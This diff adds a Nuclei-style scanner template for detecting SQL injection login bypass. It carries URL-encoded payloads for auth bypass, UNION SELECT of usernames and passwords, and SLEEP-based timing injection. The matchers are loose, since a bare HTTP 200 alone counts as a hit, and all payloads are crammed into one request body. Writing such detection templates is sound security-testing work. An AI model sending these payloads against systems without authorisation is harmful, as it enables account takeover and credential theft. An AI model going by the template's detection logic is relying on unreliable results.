@@ -1,0 +1,46 @@
+id: Login-SQLi-Auth-Bypass-Encoded
+
+info:
+  name: SQL Injection Login Bypass Detection (Fully Encoded Payloads)
+  author: Hirdesh Chauhan
+  severity: critical
+  description: Detects SQL Injection using encoded payloads including auth bypass, union, error, boolean and time-based SQLi
+  tags: sqli,login,injection,encoded
+
+http:
+  - raw:
+
+      # ------------------------------------------------
+      # 1. Authentication Bypass SQLi
+      # ' OR '1'='1'--
+      # ------------------------------------------------
+      - |
+        POST /login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        uname=admin%27%20AND%20%271%27%3D%271%27--&pass=test
+        uname=admin%27%20AND%20%271%27%3D%272%27--&pass=test
+        uname=%27%20UNION%20SELECT%20NULL%2CNULL--&pass=test
+        uname=%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--&pass=test
+        uname=%27&pass=%27
+        uname=%22%20OR%201%3D1--&pass=test
+        uname=%27%20OR%20SLEEP%285%29--&pass=test
+        uname=admin%27%20AND%20SLEEP%285%29--&pass=test
+        uname=%27%20OR%20%271%27%3D%271%27--&pass=test
+
+    redirects: true
+
+    matchers:
+
+      # Login success indicators (Auth bypass detection)
+      - type: word
+        part: body
+        words:
+          - "Logout"
+          - "User Information"
+          - "Welcome"
+          - "Sign out"
+      - type: status
+        status:
+          - 200
